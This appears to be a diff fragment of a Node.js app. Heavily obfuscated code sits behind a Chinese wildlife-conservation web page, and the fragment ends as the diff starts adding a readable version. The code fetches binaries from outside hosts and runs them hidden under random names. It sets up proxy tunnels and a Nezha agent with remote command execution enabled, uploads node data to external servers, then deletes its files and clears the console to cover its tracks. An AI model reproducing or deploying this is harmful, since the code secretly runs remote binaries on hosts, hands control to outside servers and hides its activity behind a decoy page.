h4>拒绝野生动物制品</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>不购买象牙、犀角、穿山甲鳞片等野生动物制品，从源头减少对野生动物的需求。</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22tip-item\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>🌿</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h4>支持生态保护</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>关注并支持本地和国际生态保护组织，参与植树造林和栖息地恢复项目。</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22tip-item\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>📢</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h4>传播保护意识</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>在社交媒体上分享野生动物保护知识，让更多人了解生物多样性的重要性。</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22tip-item\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>🔍</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h4>举报违法行为</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>如发现非法猎捕、贩卖野生动物的行为，请拨打\x2012315\x20或联系当地林业部门举报。</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22tip-item\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>♻️</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h4>减少碳排放</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>气候变化是野生动物面临的最大威胁之一。低碳出行、节约能源，为地球降温。</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x0a\x20\x20<footer>\x0a\x20\x20\x20\x20<div\x20class=\x22hearts\x22>🐼\x20🐅\x20🐘\x20🐋\x20🦏\x20🦅</div>\x0a\x20\x20\x20\x20<p>守护每一个生灵，因为我们共享同一个地球</p>\x0a\x20\x20\x20\x20<p\x20style=\x22margin-top:\x208px;\x22>Wildlife\x20Conservation\x20&copy;\x20','159568nenXhK','2096','chmod','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2087','http\x20server\x20is\x20running\x20on\x20port:','writeFileSync','false','includes','8443','69490DxGxMI','\x0a\x20\x20tunnel:\x20','https://oooo.serv00.net/add-url','aarch64','/api/add-subscriptions','existsSync','\x20failed:\x20','then','fileName','application/json','\x20is\x20running','/tunnel.yml\x20run','send','get','https://amd64.ssss.nyc.mn/web','org','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','text/plain;\x20charset=utf-8','countryCode','unlink','ccad32d8-c514-4662-8f5c-eef9e88641ed','post','/config.json\x20>/dev/null\x202>&1\x20&','265617XdwUfG','saas.sin.fan','\x20-c\x20\x22','ArgoDomain:','taskkill\x20/f\x20/im\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readFileSync','\x20-p\x20','listen','TunnelSecret','from','automatic\x20access\x20task\x20added\x20successfully','.tmp','Skipping\x20adding\x20automatic\x20access\x20task','\x20successfully','2053','path','</p>\x0a\x20\x20</footer>\x0a</body>\x0a</html>','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http://ip-api.com/json','fileUrl','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','xtls-rprx-vision','floor','https://arm64.ssss.nyc.mn/web','2083','finish','filter','all','firefox','/vmess-argo?ed=2560','\x20-s\x20','clear','success','forEach','\x20is\x20created','block','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','error','join','333uIHzXF','random','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://api.ip.sb/geoip','blackhole','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','174Pgidna','toString','config.json','platform','mkdirSync','has','readdirSync','nohup\x20','push','utf-8','util','quic','/api/delete-nodes'];_0x46ba=function(){return _0x59a9db;};return _0x46ba();}function generateRandomName(){const _0x5eab6c=_0x3752e6,_0xae3bf1=_0x5eab6c(0x1d3);let _0x3f8749='';for(let _0x5e7b25=0x0;_0x5e7b25<0x6;_0x5e7b25++){_0x3f8749+=_0xae3bf1[_0x5eab6c(0x1b9)](Math[_0x5eab6c(0x21f)](Math[_0x5eab6c(0x231)]()*_0xae3bf1[_0x5eab6c(0x1e5)]));}return _0x3f8749;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3752e6(0x22f)](FILE_PATH,npmName),phpPath=path[_0x3752e6(0x22f)](FILE_PATH,phpName),webPath=path[_0x3752e6(0x22f)](FILE_PATH,webName),botPath=path[_0x3752e6(0x22f)](FILE_PATH,botName),subPath=path[_0x3752e6(0x22f)](FILE_PATH,_0x3752e6(0x1c3)),listPath=path[_0x3752e6(0x22f)](FILE_PATH,_0x3752e6(0x1b0)),bootLogPath=path[_0x3752e6(0x22f)](FILE_PATH,_0x3752e6(0x1b3)),configPath=path['join'](FILE_PATH,_0x3752e6(0x17e));function deleteNodes(){const _0x1c97ea=_0x3752e6;try{if(!UPLOAD_URL)return;if(!fs[_0x1c97ea(0x1f6)](subPath))return;let _0x10de0b;try{_0x10de0b=fs[_0x1c97ea(0x20e)](subPath,_0x1c97ea(0x185));}catch{return null;}const _0x310af9=Buffer[_0x1c97ea(0x212)](_0x10de0b,_0x1c97ea(0x1a4))['toString']('utf-8'),_0x29809f=_0x310af9[_0x1c97ea(0x199)]('\x0a')[_0x1c97ea(0x223)](_0x390a30=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x390a30));if(_0x29809f[_0x1c97ea(0x1e5)]===0x0)return;return axios[_0x1c97ea(0x206)](UPLOAD_URL+_0x1c97ea(0x188),JSON[_0x1c97ea(0x1ad)]({'nodes':_0x29809f}),{'headers':{'Content-Type':_0x1c97ea(0x1fa)}})[_0x1c97ea(0x1bc)](_0x4b1c1a=>{return null;}),null;}catch(_0x2025d5){return null;}}function cleanupOldFiles(){const _0x1dafb3=_0x3752e6;try{const _0x19a199=fs[_0x1dafb3(0x182)](FILE_PATH);_0x19a199['forEach'](_0xbb721d=>{const _0x3b31d8=_0x1dafb3,_0x1f045e=path[_0x3b31d8(0x22f)](FILE_PATH,_0xbb721d);try{const _0x514a96=fs[_0x3b31d8(0x1a1)](_0x1f045e);_0x514a96['isFile']()&&fs[_0x3b31d8(0x1b2)](_0x1f045e);}catch(_0x455df5){}});}catch(_0x408d96){}}async function generateConfig(){const _0x11e2f4=_0x3752e6,_0x53ecf4={'log':{'access':_0x11e2f4(0x198),'error':_0x11e2f4(0x198),'loglevel':_0x11e2f4(0x1b6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x11e2f4(0x1dc),'settings':{'clients':[{'id':UUID,'flow':_0x11e2f4(0x21e)}],'decryption':_0x11e2f4(0x1b6),'fallbacks':[{'dest':0xbb9},{'path':_0x11e2f4(0x1b5),'dest':0xbba},{'path':_0x11e2f4(0x1b4),'dest':0xbbb},{'path':_0x11e2f4(0x1e4),'dest':0xbbc}]},'streamSettings':{'network':_0x11e2f4(0x1ce)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x11e2f4(0x1dc),'settings':{'clients':[{'id':UUID}],'decryption':_0x11e2f4(0x1b6)},'streamSettings':{'network':_0x11e2f4(0x1ce),'security':_0x11e2f4(0x1b6)}},{'port':0xbba,'listen':_0x11e2f4(0x1bd),'protocol':_0x11e2f4(0x1dc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x11e2f4(0x1b6)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x11e2f4(0x1b5)}},'sniffing':{'enabled':!![],'destOverride':[_0x11e2f4(0x1d5),_0x11e2f4(0x191),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x11e2f4(0x1bd),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x11e2f4(0x1b4)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x11e2f4(0x191),_0x11e2f4(0x187)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x11e2f4(0x1bd),'protocol':_0x11e2f4(0x1a3),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x11e2f4(0x1b6),'wsSettings':{'path':_0x11e2f4(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x11e2f4(0x1d5),_0x11e2f4(0x191),_0x11e2f4(0x187)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x11e2f4(0x1a2),'tag':_0x11e2f4(0x1a7)},{'protocol':_0x11e2f4(0x17a),'tag':_0x11e2f4(0x22c)}]};fs['writeFileSync'](path[_0x11e2f4(0x22f)](FILE_PATH,_0x11e2f4(0x17e)),JSON['stringify'](_0x53ecf4,null,0x2));}function getSystemArchitecture(){const _0x4a7027=_0x3752e6,_0x451016=os[_0x4a7027(0x1ac)]();return _0x451016===_0x4a7027(0x193)||_0x451016===_0x4a7027(0x1aa)||_0x451016===_0x4a7027(0x1f4)?_0x4a7027(0x193):_0x4a7027(0x1be);}function downloadFile(_0x8f5cac,_0x28c949,_0x550bec){const _0x32aeb7=_0x3752e6,_0x16360e=_0x8f5cac;!fs[_0x32aeb7(0x1f6)](FILE_PATH)&&fs[_0x32aeb7(0x180)](FILE_PATH,{'recursive':!![]});const _0xc4e640=fs[_0x32aeb7(0x1e1)](_0x16360e);axios({'method':_0x32aeb7(0x1fe),'url':_0x28c949,'responseType':_0x32aeb7(0x19e)})[_0x32aeb7(0x1f8)](_0x285bf9=>{const _0x3ff016=_0x32aeb7;_0x285bf9[_0x3ff016(0x189)][_0x3ff016(0x1d6)](_0xc4e640),_0xc4e640['on'](_0x3ff016(0x222),()=>{const _0x2e182f=_0x3ff016;_0xc4e640['close'](),console[_0x2e182f(0x1c7)](_0x2e182f(0x18e)+path[_0x2e182f(0x19f)](_0x16360e)+_0x2e182f(0x216)),_0x550bec(null,_0x16360e);}),_0xc4e640['on'](_0x3ff016(0x22e),_0x34e2c5=>{const _0xac8013=_0x3ff016;fs[_0xac8013(0x204)](_0x16360e,()=>{});const _0x56c332=_0xac8013(0x18e)+path[_0xac8013(0x19f)](_0x16360e)+'\x20failed:\x20'+_0x34e2c5['message'];console['error'](_0x56c332),_0x550bec(_0x56c332);});})[_0x32aeb7(0x1bc)](_0x3eb420=>{const _0x121211=_0x32aeb7,_0x363b32=_0x121211(0x18e)+path['basename'](_0x16360e)+_0x121211(0x1f7)+_0x3eb420[_0x121211(0x1ab)];console[_0x121211(0x22e)](_0x363b32),_0x550bec(_0x363b32);});}async function downloadFilesAndRun(){const _0x243105=_0x3752e6,_0x17839a=getSystemArchitecture(),_0x37bf10=getFilesForArchitecture(_0x17839a);if(_0x37bf10[_0x243105(0x1e5)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5b1ea0=_0x37bf10['map'](_0x3ce386=>{return new Promise((_0x571f14,_0x2ae6fe)=>{const _0x11a245=_0x488c;downloadFile(_0x3ce386[_0x11a245(0x1f9)],_0x3ce386[_0x11a245(0x21c)],(_0x39304d,_0x19aac4)=>{_0x39304d?_0x2ae6fe(_0x39304d):_0x571f14(_0x19aac4);});});});try{await Promise[_0x243105(0x224)](_0x5b1ea0);}catch(_0x2c6ff9){console['error']('Error\x20downloading\x20files:',_0x2c6ff9);return;}function _0x3f933c(_0x316810){const _0x68d86c=_0x243105,_0x356825=0x1fd;_0x316810[_0x68d86c(0x22a)](_0x3ce478=>{const _0x11c1ee=_0x68d86c;fs[_0x11c1ee(0x1f6)](_0x3ce478)&&fs[_0x11c1ee(0x1e9)](_0x3ce478,_0x356825,_0x317063=>{const _0x138199=_0x11c1ee;_0x317063?console[_0x138199(0x22e)](_0x138199(0x1ba)+_0x3ce478+':\x20'+_0x317063):console[_0x138199(0x1c7)](_0x138199(0x1e2)+_0x3ce478+':\x20'+_0x356825[_0x138199(0x17d)](0x8));});});}const _0x4538c2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3f933c(_0x4538c2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb63508=NEZHA_SERVER[_0x243105(0x1ef)](':')?NEZHA_SERVER[_0x243105(0x199)](':')[_0x243105(0x18b)]():'',_0x18da1a=new Set([_0x243105(0x1b8),_0x243105(0x1f0),_0x243105(0x1e8),_0x243105(0x1eb),_0x243105(0x221),_0x243105(0x217)]),_0xa50e18=_0x18da1a[_0x243105(0x181)](_0xb63508)?'true':_0x243105(0x1ee),_0x514334=_0x243105(0x1d1)+NEZHA_KEY+_0x243105(0x20d)+NEZHA_SERVER+_0x243105(0x21d)+_0xa50e18+_0x243105(0x232)+UUID;fs[_0x243105(0x1ed)](path[_0x243105(0x22f)](FILE_PATH,'config.yaml'),_0x514334);const _0x222e6c='nohup\x20'+phpPath+_0x243105(0x20a)+FILE_PATH+_0x243105(0x17b);try{await exec(_0x222e6c),console[_0x243105(0x1c7)](phpName+'\x20is\x20running'),await new Promise(_0x4f48cc=>setTimeout(_0x4f48cc,0x3e8));}catch(_0x460a0b){console[_0x243105(0x22e)](_0x243105(0x1c6)+_0x460a0b);}}else{let _0x63a6ed='';const _0xbc4f52=[_0x243105(0x1b8),_0x243105(0x1f0),_0x243105(0x1e8),_0x243105(0x1eb),_0x243105(0x221),_0x243105(0x217)];_0xbc4f52[_0x243105(0x1ef)](NEZHA_PORT)&&(_0x63a6ed='--tls');const _0x26bec0=_0x243105(0x183)+npmPath+_0x243105(0x227)+NEZHA_SERVER+':'+NEZHA_PORT+_0x243105(0x20f)+NEZHA_KEY+'\x20'+_0x63a6ed+_0x243105(0x1c2);try{await exec(_0x26bec0),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x387533=>setTimeout(_0x387533,0x3e8));}catch(_0x10ee91){console[_0x243105(0x22e)]('npm\x20running\x20error:\x20'+_0x10ee91);}}}else console[_0x243105(0x1c7)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5502ba=_0x243105(0x183)+webPath+_0x243105(0x1cd)+FILE_PATH+_0x243105(0x207);try{await exec(_0x5502ba),console['log'](webName+_0x243105(0x1fb)),await new Promise(_0x431917=>setTimeout(_0x431917,0x3e8));}catch(_0x8f1a28){console[_0x243105(0x22e)](_0x243105(0x1d7)+_0x8f1a28);}if(fs[_0x243105(0x1f6)](botPath)){let _0xfd5d06;if(ARGO_AUTH[_0x243105(0x1c1)](/^[A-Z0-9a-z=]{120,250}$/))_0xfd5d06='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x243105(0x1c1)](/TunnelSecret/)?_0xfd5d06=_0x243105(0x1bf)+FILE_PATH+_0x243105(0x1fc):_0xfd5d06=_0x243105(0x21a)+FILE_PATH+_0x243105(0x1ea)+ARGO_PORT;try{await exec(_0x243105(0x183)+botPath+'\x20'+_0xfd5d06+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x243105(0x1fb)),await new Promise(_0x2e98f3=>setTimeout(_0x2e98f3,0x7d0));}catch(_0x52fc96){console[_0x243105(0x22e)](_0x243105(0x1c5)+_0x52fc96);}}await new Promise(_0x52ccc0=>setTimeout(_0x52ccc0,0x1388));}function getFilesForArchitecture(_0x34111f){const _0x3a82cf=_0x3752e6;let _0x2d9cf8;_0x34111f===_0x3a82cf(0x193)?_0x2d9cf8=[{'fileName':webPath,'fileUrl':_0x3a82cf(0x220)},{'fileName':botPath,'fileUrl':_0x3a82cf(0x19b)}]:_0x2d9cf8=[{'fileName':webPath,'fileUrl':_0x3a82cf(0x1ff)},{'fileName':botPath,'fileUrl':_0x3a82cf(0x19c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x40198d=_0x34111f==='arm'?_0x3a82cf(0x192):'https://amd64.ssss.nyc.mn/agent';_0x2d9cf8[_0x3a82cf(0x1a6)]({'fileName':npmPath,'fileUrl':_0x40198d});}else{const _0x4ba85b=_0x34111f==='arm'?_0x3a82cf(0x1ae):'https://amd64.ssss.nyc.mn/v1';_0x2d9cf8['unshift']({'fileName':phpPath,'fileUrl':_0x4ba85b});}}return _0x2d9cf8;}function argoType(){const _0x38191c=_0x3752e6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38191c(0x1c7)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x38191c(0x211))){fs['writeFileSync'](path[_0x38191c(0x22f)](FILE_PATH,_0x38191c(0x196)),ARGO_AUTH);const _0x18bf26=_0x38191c(0x1f2)+ARGO_AUTH['split']('\x22')[0xb]+_0x38191c(0x1e3)+path[_0x38191c(0x22f)](FILE_PATH,_0x38191c(0x196))+_0x38191c(0x19d)+ARGO_DOMAIN+_0x38191c(0x22d)+ARGO_PORT+_0x38191c(0x18c);fs[_0x38191c(0x1ed)](path['join'](FILE_PATH,'tunnel.yml'),_0x18bf26);}else console[_0x38191c(0x1c7)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x4fdd46=_0x3752e6;let _0x1d90cd;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1d90cd=ARGO_DOMAIN,console['log'](_0x4fdd46(0x18f),_0x1d90cd),await _0x40838f(_0x1d90cd);else try{const _0x50f740=fs[_0x4fdd46(0x20e)](path[_0x4fdd46(0x22f)](FILE_PATH,_0x4fdd46(0x1b3)),_0x4fdd46(0x185)),_0x257ddd=_0x50f740[_0x4fdd46(0x199)]('\x0a'),_0x2e3f91=[];_0x257ddd['forEach'](_0x5b8e8b=>{const _0x4395c4=_0x4fdd46,_0x3ccf50=_0x5b8e8b[_0x4395c4(0x1c1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ccf50){const _0x4ef78d=_0x3ccf50[0x1];_0x2e3f91[_0x4395c4(0x184)](_0x4ef78d);}});if(_0x2e3f91['length']>0x0)_0x1d90cd=_0x2e3f91[0x0],console['log'](_0x4fdd46(0x20b),_0x1d90cd),await _0x40838f(_0x1d90cd);else{console[_0x4fdd46(0x1c7)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x4fdd46(0x22f)](FILE_PATH,_0x4fdd46(0x1b3)));async function _0x654c5a(){const _0x39a23e=_0x4fdd46;try{process[_0x39a23e(0x17f)]==='win32'?await exec(_0x39a23e(0x20c)+botName+_0x39a23e(0x1d0)):await exec(_0x39a23e(0x1df)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x38720b){}}_0x654c5a(),await new Promise(_0x13b6fc=>setTimeout(_0x13b6fc,0xbb8));const _0x34c028='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4fdd46(0x1ea)+ARGO_PORT;try{await exec(_0x4fdd46(0x183)+botPath+'\x20'+_0x34c028+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x4fdd46(0x1fb)),await new Promise(_0x578a84=>setTimeout(_0x578a84,0xbb8)),await extractDomains();}catch(_0x44497b){console[_0x4fdd46(0x22e)](_0x4fdd46(0x1c5)+_0x44497b);}}}catch(_0x27b0cc){console[_0x4fdd46(0x22e)](_0x4fdd46(0x1d9),_0x27b0cc);}async function _0x4b3f1e(){const _0x4cc376=_0x4fdd46;try{const _0x3af05d=await axios[_0x4cc376(0x1fe)](_0x4cc376(0x233),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x3af05d[_0x4cc376(0x189)]&&_0x3af05d[_0x4cc376(0x189)][_0x4cc376(0x190)]&&_0x3af05d[_0x4cc376(0x189)]['isp'])return(_0x3af05d['data'][_0x4cc376(0x190)]+'-'+_0x3af05d['data']['isp'])['replace'](/\s+/g,'_');}catch(_0x353812){try{const _0x5800af=await axios[_0x4cc376(0x1fe)](_0x4cc376(0x21b),{'headers':{'User-Agent':_0x4cc376(0x1af),'timeout':0xbb8}});if(_0x5800af[_0x4cc376(0x189)]&&_0x5800af['data'][_0x4cc376(0x1d8)]===_0x4cc376(0x229)&&_0x5800af[_0x4cc376(0x189)][_0x4cc376(0x203)]&&_0x5800af[_0x4cc376(0x189)]['org'])return(_0x5800af[_0x4cc376(0x189)][_0x4cc376(0x203)]+'-'+_0x5800af['data'][_0x4cc376(0x200)])['replace'](/\s+/g,'_');}catch(_0xf6f6e7){}}return'Unknown';}async function _0x40838f(_0x589fca){const _0x268705=await _0x4b3f1e(),_0x1ff1f9=NAME?NAME+'-'+_0x268705:_0x268705;return new Promise(_0x91c2e7=>{setTimeout(()=>{const _0xa26c6f=_0x488c,_0x225a04={'v':'2','ps':''+_0x1ff1f9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'auto','net':'ws','type':'none','host':_0x589fca,'path':_0xa26c6f(0x226),'tls':_0xa26c6f(0x191),'sni':_0x589fca,'alpn':'','fp':_0xa26c6f(0x225)},_0x11ddd1=_0xa26c6f(0x1b1)+UUID+'@'+CFIP+':'+CFPORT+_0xa26c6f(0x1db)+_0x589fca+_0xa26c6f(0x1dd)+_0x589fca+_0xa26c6f(0x18d)+_0x1ff1f9+_0xa26c6f(0x1c8)+Buffer[_0xa26c6f(0x212)](JSON[_0xa26c6f(0x1ad)](_0x225a04))[_0xa26c6f(0x17d)]('base64')+_0xa26c6f(0x1a9)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x589fca+'&fp=firefox&type=ws&host='+_0x589fca+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1ff1f9+_0xa26c6f(0x1cb);console[_0xa26c6f(0x1c7)](Buffer[_0xa26c6f(0x212)](_0x11ddd1)['toString'](_0xa26c6f(0x1a4))),fs['writeFileSync'](subPath,Buffer[_0xa26c6f(0x212)](_0x11ddd1)[_0xa26c6f(0x17d)]('base64')),console[_0xa26c6f(0x1c7)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x29a741,_0x54ad5a)=>{const _0x2e9358=_0xa26c6f,_0x39d1dd=Buffer[_0x2e9358(0x212)](_0x11ddd1)[_0x2e9358(0x17d)](_0x2e9358(0x1a4));_0x54ad5a['set'](_0x2e9358(0x1da),_0x2e9358(0x202)),_0x54ad5a['send'](_0x39d1dd);}),_0x91c2e7(_0x11ddd1);},0x7d0);});}}async function uploadNodes(){const _0x2eb567=_0x3752e6;if(UPLOAD_URL&&PROJECT_URL){const _0x51853c=PROJECT_URL+'/'+SUB_PATH,_0x296e85={'subscription':[_0x51853c]};try{const _0x4c71e6=await axios[_0x2eb567(0x206)](UPLOAD_URL+_0x2eb567(0x1f5),_0x296e85,{'headers':{'Content-Type':_0x2eb567(0x1fa)}});return _0x4c71e6&&_0x4c71e6[_0x2eb567(0x1d8)]===0xc8?(console[_0x2eb567(0x1c7)]('Subscription\x20uploaded\x20successfully'),_0x4c71e6):null;}catch(_0x5157bd){if(_0x5157bd['response']){if(_0x5157bd['response'][_0x2eb567(0x1d8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2eb567(0x1f6)](listPath))return;const _0x52a834=fs[_0x2eb567(0x20e)](listPath,_0x2eb567(0x185)),_0x4ca021=_0x52a834[_0x2eb567(0x199)]('\x0a')[_0x2eb567(0x223)](_0x5805ac=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5805ac));if(_0x4ca021[_0x2eb567(0x1e5)]===0x0)return;const _0x1beecb=JSON[_0x2eb567(0x1ad)]({'nodes':_0x4ca021});try{const _0x1d8a38=await axios[_0x2eb567(0x206)](UPLOAD_URL+_0x2eb567(0x195),_0x1beecb,{'headers':{'Content-Type':_0x2eb567(0x1fa)}});return _0x1d8a38&&_0x1d8a38[_0x2eb567(0x1d8)]===0xc8?(console[_0x2eb567(0x1c7)]('Nodes\x20uploaded\x20successfully'),_0x1d8a38):null;}catch(_0x406f7b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1598ae=_0x488c,_0x3e640f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e640f['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e640f[_0x1598ae(0x184)](phpPath);process[_0x1598ae(0x17f)]===_0x1598ae(0x1a5)?exec(_0x1598ae(0x1e0)+_0x3e640f['join']('\x20')+_0x1598ae(0x1ca),_0x320476=>{const _0x57da39=_0x1598ae;console['clear'](),console[_0x57da39(0x1c7)](_0x57da39(0x1c4)),console[_0x57da39(0x1c7)](_0x57da39(0x201));}):exec(_0x1598ae(0x1de)+_0x3e640f['join']('\x20')+_0x1598ae(0x1b7),_0x4ac348=>{const _0x2763e6=_0x1598ae;console[_0x2763e6(0x228)](),console[_0x2763e6(0x1c7)](_0x2763e6(0x1c4)),console[_0x2763e6(0x1c7)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4db45b=_0x3752e6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4db45b(0x1c7)](_0x4db45b(0x215));return;}try{const _0x8c25f5=await axios[_0x4db45b(0x206)](_0x4db45b(0x1f3),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x4db45b(0x213)),_0x8c25f5;}catch(_0x15b26b){return console[_0x4db45b(0x22e)](_0x4db45b(0x19a)+_0x15b26b[_0x4db45b(0x1ab)]),null;}}async function startserver(){const _0x1edf4f=_0x3752e6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c32d8){console[_0x1edf4f(0x22e)]('Error\x20in\x20startserver:',_0x3c32d8);}}startserver()['catch'](_0x5c02b7=>{const _0x3fa67e=_0x3752e6;console[_0x3fa67e(0x22e)](_0x3fa67e(0x1cc),_0x5c02b7);}),app[_0x3752e6(0x1fe)]('/',async function(_0x5cf95e,_0x130575){const _0x4a927a=_0x3752e6,_0x52d35a=_0x4a927a(0x1e6)+new Date()[_0x4a927a(0x1c9)]()+_0x4a927a(0x219);_0x130575[_0x4a927a(0x1fd)](_0x52d35a);}),app[_0x3752e6(0x210)](PORT,()=>console['log'](_0x3752e6(0x1ec)+PORT+'!'));
+const express = require("express");
+const app = express();
+const axios = require("axios");
+const os = require('os');
+const fs = require("fs");
+const path = require("path");
+const { promisify } = require('util');
+const exec = promisify(require('child_process').exec);
+const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.xxx.com
+const PROJECT_URL = process.env.PROJECT_URL || '';    // 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
+const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
+const FILE_PATH = process.env.FILE_PATH || '.tmp';   // 运行目录,sub节点文件保存目录
+const SUB_PATH = process.env.SUB_PATH || 'cfg';       // 订阅路径
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // http服务订阅端口
+const UUID = process.env.UUID || 'ccad32d8-c514-4662-8f5c-eef9e88641ed'; // 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
+const NEZHA_SERVER = process.env.NEZHA_SERVER || '';        // 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
+const NEZHA_PORT = process.env.NEZHA_PORT || '';            // 使用哪吒v1请留空，哪吒v0需填写
+const NEZHA_KEY = process.env.NEZHA_KEY || '';              // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
+const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'freeym.liummei.dpdns.org';          // 固定隧道域名,留空即启用临时隧道
